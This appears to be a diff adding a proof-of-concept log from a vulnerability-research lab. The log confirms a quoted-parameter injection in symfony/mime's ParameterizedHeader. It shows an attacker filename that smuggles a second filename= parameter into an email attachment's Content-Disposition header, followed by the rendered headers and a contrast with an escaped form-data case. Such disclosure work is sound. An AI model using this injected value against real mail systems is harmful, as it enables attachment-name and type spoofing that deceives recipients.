@@ -1,0 +1,16 @@
+==============================================================================
+VULN-002: Mime ParameterizedHeader quoted param-value injection (attachment spoofing)
+container: cvehunterlab_symfony_app   component: symfony/mime (no HTTP endpoint — library sink)
+==============================================================================
+[INFO] rendering a real attachment (DataPart) whose filename breaks out of the quoted value
+[INFO] sink: ParameterizedHeader::getEndOfParameterValue() :179  ($value = '"'.$value.'"')
+[STEP] attacker filename ................. 'safe.txt"; filename="evil.html'
+[STEP] rendered Content-Disposition ..... Content-Disposition: attachment; name="safe.txt"; filename="evil.html"; filename="safe.txt"; filename="evil.html"
+[STEP] rendered Content-Type ............ Content-Type: text/plain; name="safe.txt"; filename="evil.html"
+[STEP] filename= parameters in C-D ...... 3
+[STEP] CONTRAST form-data header ........ Content-Disposition: form-data; filename="safe.txt%22; filename=%22evil.html"
+------------------------------------------------------------------------------
+[PROOF] Content-Disposition carries 3 filename= params (duplicate injected); the `"` is NOT backslash-escaped
+[PROOF] CONTRAST: same class on a form-data disposition escaped `"`->`%22` (no injected param) — the attachment path is the unprotected gap
+[OK] exploit confirmed — attacker filename injected a second filename= param (attachment-name/type spoofing on outbound mail)
+==> VULN-002: CONFIRMED — Mime ParameterizedHeader quoted param-value injection
